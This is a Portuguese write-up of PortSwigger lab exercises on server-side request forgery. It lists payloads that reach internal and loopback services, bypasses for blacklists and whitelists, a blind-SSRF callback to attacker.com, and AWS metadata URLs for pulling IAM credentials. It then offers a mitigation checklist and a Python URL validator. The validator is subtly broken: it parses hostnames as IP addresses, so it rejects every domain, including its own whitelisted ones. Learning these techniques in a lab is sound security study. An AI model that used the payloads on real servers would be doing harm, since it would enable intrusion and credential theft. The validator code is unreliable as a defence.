# 🌐 SSRF – Server-Side Request Forgery | PortSwigger Web Security Academy

## 📋 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Requisições Web & Manipulação |
| **Nível de Dificuldade** | Practitioner |
| **Status** | ✅ 7/7 Laboratórios Concluídos |
| **Data** | Junho 2026 |
| **Ferramentas** | Burp Suite, Interactsh |

---

## 🎯 Objetivo do Laboratório

Dominar Server-Side Request Forgery (SSRF), permitindo manipular requisições feitas pela aplicação para acessar recursos internos, contornar filtros e explorar serviços ocultos.

---

## 📖 Resumo Executivo

SSRF permite forçar a aplicação a fazer requisições para recursos não intencionais:
1. **Servidores internos** — 192.168.x.x, 10.0.0.x
2. **Metadados cloud** — AWS EC2, Azure, GCP
3. **Serviços locais** — localhost:8080, 127.0.0.1:3306
4. **Máquinas externas** — pivot para atacar infraestrutura

---

## 📚 Conceitos Teóricos

### O que é SSRF?

Aplicação aceita URL do usuário e faz requisição **em nome do servidor**:

```python
# ❌ VULNERÁVEL
url = request.args.get('url')
response = requests.get(url)  # Servidor faz requisição!
return response.text
```

Atacante com `?url=http://192.168.1.1:8080/admin` acessa **interface local** via servidor.

### Por que é perigoso?

- Servidor tem acesso a redes internas
- Firewall protege contra ataque direto, mas não contra SSRF
- Possível escalonamento com cloud metadata
- Pode ser chainado com outras vulnerabilidades

---

## 🎯 Técnicas Exploradas

### 1. Basic SSRF Against Local Server

```
?url=http://127.0.0.1/admin
```

**Resultado**: Acesso a `/admin` local.

---

### 2. SSRF Against Backend Systems

```
?url=http://192.168.0.100:8080/config
```

**Resultado**: Acesso a servidor interno da rede.

---

### 3. SSRF com Blacklist Bypass

Se bloqueado `127.0.0.1`:

```
?url=http://localhost/admin
?url=http://0.0.0.0/admin
?url=http://127.1/admin
?url=http://127.0.0.1.nip.io/admin  (alternativos DNS)
?url=http://[::1]/admin  (IPv6)
?url=http://2130706433/admin  (formato numérico: 127.0.0.1)
```

---

### 4. SSRF com Whitelist Bypass

Se apenas "example.com" permitido:

```
?url=https://example.com@192.168.0.1/admin  (@ bypass)
?url=https://example.com#192.168.0.1/admin  (# bypass)
?url=https://192.168.0.1:80@example.com/admin  (combinado)
```

---

### 5. Blind SSRF com OAST

```
?url=http://attacker.com/callback
```

**Resultado**: DNS lookup/HTTP request é visível em attacker.com.

---

### 6. SSRF com Cloud Metadata

AWS EC2:
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Resultado**: Credenciais AWS, IAM roles.

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Acesso a dados internos |
| **Integridade** | 🔴 Alto | Possível modifcação via POST |
| **Disponibilidade** | 🟠 Médio | DoS interno |
| **Privilégios Necessários** | Verde | Nenhum |
| **Tipo de Ataque** | Ativo | Manipulação de URL |

---

## 🛡️ Mitigação & Defesa

### ✅ Implementação Segura

```python
# ✅ Validar URL
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        
        # ❌ Bloquear protocolos perigosos
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # ❌ Bloquear IP privado
        ip = parsed.hostname
        if ipaddress.ip_address(ip).is_private:
            return False
        
        # ❌ Bloquear localhost
        if ip in ['localhost', '127.0.0.1', '0.0.0.0']:
            return False
        
        # ✅ Whitelist de domínios permitidos
        ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']
        if parsed.hostname not in ALLOWED_HOSTS:
            return False
        
        return True
    except:
        return False

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    if not is_safe_url(url):
        return "URL não permitida", 403
    
    return requests.get(url).text
```

### Princípios

- [x] Whitelist de domínios/IPs permitidos
- [x] Bloquear IPs privados e localhost
- [x] Validar protocolo (http/https apenas)
- [x] Timeout curto em requisições
- [x] Não seguir redirects (ou whitelist)
- [x] Firewall egress (bloquear saída interna)
- [x] Desabilitar protocolos perigosos (file://, gopher://)

---

## 🎓 Lições Aprendidas

### Insight 1: Firewall Interno Não Protege Contra SSRF
SSRF burla firewall porque vem de dentro.

### Insight 2: Encoding/Bypass é Arte
Blacklist nunca funciona. Sempre há alternativa (IPv6, DNS, numérica).

### Insight 3: Cloud Metadata é Alvo
AWS 169.254.169.254 é ouro no ar.

### Insight 4: Blind SSRF é Real
Sem retorno visível, ainda há DNS/HTTP exfiltração.

---

## 📖 Referências

- **OWASP**: [Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
- **CWE**: [CWE-918 - Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- **PortSwigger**: [SSRF](https://portswigger.net/web-security/ssrf)
- **HackTricks**: [SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

---

**Autor**: Aislan Silva  
**Data de Conclusão**: Junho 2026  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
